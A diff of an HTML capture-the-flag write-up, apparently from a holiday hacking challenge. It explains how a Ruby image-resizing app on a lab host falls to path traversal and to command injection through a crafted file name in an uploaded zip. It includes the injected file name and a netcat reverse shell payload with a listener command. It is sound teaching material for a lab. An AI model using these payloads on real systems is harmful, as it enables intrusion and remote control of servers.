@@ -671,7 +671,7 @@ Can you help me figure out what's wrong?<br/></p>
 <h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">⚓︎</a></h2>
 <div class="admonition note">
 <p class="admonition-title">Quick 'n dirty or reverse shell?</p>
-<p>You can either solve this with minimal effort or you can go for a reverse shell. We'll explore both options! <img alt="😄" class="twemoji" src="https://twemoji.maxcdn.com/v/latest/svg/1f604.svg" title=":smile:" /></p>
+<p>You can either solve this with minimal effort or you can go for a <a href="./#reverse-shell">reverse shell</a>. We'll explore both options! <img alt="😄" class="twemoji" src="https://twemoji.maxcdn.com/v/latest/svg/1f604.svg" title=":smile:" /></p>
 </div>
 <h3>Short solution</h3>
 <p>Start by analyzing the <a href="https://tag-generator.kringlecastle.com/js/app.js"><code>app.js</code></a> JavaScript code. After a successful file upload the uploaded image will be accessible via the <code>/image?id=</code> endpoint with <code>id</code> being a randomly generated value that identifies the image (line 7). </p>
@@ -724,10 +724,11 @@ Can you help me figure out what's wrong?<br/></p>
 <div class="admonition info">
 <p class="admonition-title">Tricking web browsers using <code>X-Content-Type-Options: nosniff</code></p>
 <p>The <code>X-Content-Type-Options: nosniff</code> header in the HTTP response message prevents web browsers from doing MIME-type sniffing. The web browser will take whatever is set as the <code>Content-Type</code> and assume that information is correct. In this case, the HTTP response tells the browser the data is an <code>image/jpg</code> file which the browser fails to render. As a result, using an invalid <code>id</code> in a web browser will display an image rendering error instead.</p>
-<div class="highlight"><pre><span></span><code>The image “https://tag-generator.kringlecastle.com/image?id=somethingsomething%20test” cannot be displayed because it contains errors.
+<div class="highlight"><pre><span></span><code>The image “https://tag-generator.kringlecastle.com/image?id=somethingsomething%20test”
+cannot be displayed because it contains errors.
 </code></pre></div>
 </div>
-<p>We can leverage the same <a href="https://owasp.org/www-community/attacks/Path_Traversal">path traversal attack</a> as before by issuing a request to <code>https://tag-generator.kringlecastle.com/image?id=../../../app/lib/app.rb</code> to download <a href="../../artifacts/objectives/o8/app.rb"><code>app.rb</code></a>. Because the backend code does not filter the <code>filename</code> variable prior to using it in the <code>system</code> call, we can leverage this flaw to execute our own code (line 7).</p>
+<p>We can leverage the same <a href="https://owasp.org/www-community/attacks/Path_Traversal">path traversal attack</a> as before by issuing a request to <code>https://tag-generator.kringlecastle.com/image?id=../../../app/lib/app.rb</code> to download <a href="../../artifacts/objectives/o8/app.rb"><code>app.rb</code></a>. Reviewing the code, we can see that the web application uses a <code>system()</code> call to resize the uploaded image to a specific size (line 7). Because the backend Ruby code does not filter the <code>filename</code> variable used as input to the <code>system()</code> call, we can leverage this <a href="https://owasp.org/www-community/attacks/Command_Injection">command injection</a> vulnerability to execute our own code.</p>
 <table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
  2
  3
@@ -753,8 +754,13 @@ Can you help me figure out what's wrong?<br/></p>
   <span class="k">end</span>
 </code></pre></div>
 </td></tr></table>
-<p>Structuring the filename of the uploaded file as <code>myfile';command_to_run;ls '.png</code> will translate the <code>convert</code> command into <code>convert -resize 800x600\\&gt; -quality 75 'myfile';</code>, <code>command_to_run;</code>, and <code>ls '.png' '#{ out_path }'</code>. Nudging our own command neatly in the middle. </p>
-<p>The <code>process_file()</code> function tells us the app allows uploading files with an extension matching either <code>.jpg</code>, <code>.jpeg</code>, <code>.png</code>, or <code>.zip</code>. To prevent our uploaded file from being renamed at the server side we can leverage the <code>handle_zip()</code> function as it leaves filenames as-is after unpacking the uploaded archive (line 7). Luckily for us, Jack also commented out the filename validation code (line 2). Thanks, Jack! <img alt="👍" class="twemoji" src="https://twemoji.maxcdn.com/v/latest/svg/1f44d.svg" title=":thumbsup:" /></p>
+<p>Structuring the filename of the uploaded file as <code>myfile';command_to_run;ls '.png</code> will split the single <code>convert</code> command into 3 separate shell commands, nudging whatever we want to run neatly in the middle:</p>
+<ul>
+<li><code>convert -resize 800x600\\&gt; -quality 75 'myfile';</code></li>
+<li><code>command_to_run;</code></li>
+<li><code>ls '.png' '#{ out_path }'</code></li>
+</ul>
+<p>The <code>process_file()</code> function tells us the app allows uploading files with an extension matching either <code>.jpg</code>, <code>.jpeg</code>, <code>.png</code>, or <code>.zip</code>. To prevent our uploaded file from being renamed at the server side we can leverage the <code>handle_zip()</code> function as it leaves filenames untouched when unpacking an uploaded archive (line 7). Luckily for us, Jack commented out the filename validation code that would've patched this issue (line 2). Thanks, Jack! <img alt="👍" class="twemoji" src="https://twemoji.maxcdn.com/v/latest/svg/1f44d.svg" title=":thumbsup:" /></p>
 <table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
  2
  3
@@ -795,7 +801,7 @@ Can you help me figure out what's wrong?<br/></p>
 <p>JackFrostWasHere</p>
 </div>
 <div class="admonition note">
-<p class="admonition-title">Reverse shell</p>
+<p class="admonition-title">Reverse shell<span id="reverse-shell"></span></p>
 <p>A request to <code>https://tag-generator.kringlecastle.com/image?id=../../../bin/nc</code> confirms that netcat is available so we can leverage the code execution vulnerability to establish a reverse shell with full interactive access. The command we need to run on the host is <code>nc 1.2.3.4 55100 -e /usr/bin/sh</code>, but forward slashes are not an option as they're not allowed in a file name.</p>
 <p>We can work around this limitation by using <code>`which sh`</code> to ask the system what the full path for the <code>sh</code> binary is, instead of specifying it as part of the filename. The image filename now becomes <code>myfile';nc 1.2.3.4 55100 -e `which sh`;ls '.png</code>. Set up a local listener using <code>nc -nlvp 55100</code>, upload the <a href="../../tools/objectives/o8/reverse_shell_payload.zip">zipped image file</a>, and wait for the reverse shell connection to be established.</p>
 <p><img alt="Reverse shell" src="../../img/objectives/o8/reverse_shell.png" /></p>
